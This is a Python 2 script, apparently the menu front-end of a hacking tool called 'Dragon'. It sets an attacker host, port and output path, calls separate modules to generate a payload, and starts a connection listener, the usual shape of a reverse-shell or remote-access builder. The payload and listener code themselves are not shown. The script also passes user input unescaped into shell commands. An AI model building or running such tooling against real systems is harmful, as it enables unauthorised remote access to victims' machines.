#!/usr/bin/env python
# -*- coding: utf-8 -*-
#This Script is Created By:~ Cyber Team
#Edited by Sachin Shrivastv
import os, sys, subprocess,time
from time import sleep
os.system("clear")
reload(sys)
sys.setdefaultencoding("utf-8")

host = " "
port = " "
output = " "

def logo():
	os.system('clear')
	print("                         ,     \    /      ,")
	time.sleep(0.1)
	print('''                        / \    )\__/(     / \'''')
	time.sleep(0.1)
	print('''                       /   \  (_\  /_)   /   \'''')
	time.sleep(0.1)
	print('   <__________________/_____\__\@  @/___/_____\_________________>')
	time.sleep(0.1)
	print('    |                          |\../|                          |')
	time.sleep(0.1)
	print('    |                           \VV/                           |')
	time.sleep(0.1)
	print('    |                    \033[1;93mOwner:~  Badhshah\033[1;97m                     |')	
	time.sleep(0.1)
	print('    |                 \033[1;93mAuthor:~ Sachin Shrivastv\033[1;97m                |')
	time.sleep(0.1)
	print('    |                 \033[1;93mYoutube:~ Badhshah Hacker\033[1;97m                |')
	time.sleep(0.1)
	print('    |                 \033[1;93mAscli art by:~ Brian Young\033[1;97m               |')
	time.sleep(0.1)
	print('    |__________________________________________________________|')
	time.sleep(0.1)
	print('''                  |    /\ /      \\\        \ /\    |''')
	time.sleep(0.1)
	print('                  |  /   V        ))        V   \  |')
	time.sleep(0.1)
	print('                  |/     `       //         `     \|')
	time.sleep(0.1)
	print('''                  `              V''')
	print('}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{')

def help():
 print("""Commands :
       set HOST       : Set Your Host (e.g set HOST 127.0.0.1)
       set PORT       : Set Your Port (e.g set PORT 1337)
       set OUTPUT     : Set Your Output Name And Path (e.g set OUTPUT /home/payload)
       show values    : Show Host, Port And Output Value
       start listener : Start Your Conection Server """)
print('}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{')
       
def main():
    global host, port, output

    while True:
        cmd = raw_input("{@} Dragon:~ ").lower()

        if cmd == "help":
            help()

        elif cmd == 'restart' or cmd =='clear':
            os.system("clear")
            logo()
            main()

        elif "set host" in cmd:
            host = cmd.split()[-1]

        elif "set port" in cmd:
            port = int(cmd.split()[-1])

        elif "set output" in cmd:
            output = cmd.split()[-1]

        elif cmd == "show values" or cmd =='show':
            print "\n[+] HOST   : %s\n[+] PORT   : %s\n[+] OUTPUT : %s\n"%(host, port,output)

        elif cmd == "generate payload" or cmd == "generate" or cmd == "execute":
            if host != " " and port != " " and output != " ":
                print("[+] Generating Payload . . .")
                sleep(1)
                print("[*] Using Configuration . . .\n |_ HOST   : "+host+"\n |_ PORT   : "+str(port)+"\n |_ OUTPUT : "+output)
                sleep(3)
                os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
                print("[+] Generating Success . . .")
                sleep(1)
                main()
            else:
                print "\n[!] HOST   : %s\n[!] PORT   : %s\n[!] OUTPUT : %s\n"%(host,port,output)

        elif cmd == "start" or cmd == "run" or cmd == "start listener":
            if host != " " and port != " ":
                if os.name == "nt":
                    subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    os.system(sys.executable + " modules/listener.py %s %s"%(host, str(port)))
            else:
                print "\n[!] Host : %s\n[!] Port : %s\n"%(host,port)
        else:
            print("[!] Check Your Command . . .")
            main()

def contol():
    try:
        logo()
        main()
    except KeyboardInterrupt:
        print("\n[!] CTRL+C Detect Exiting Tools . . .")
        sleep(2)
        sys.exit()
if __name__ == "__main__":
    contol()
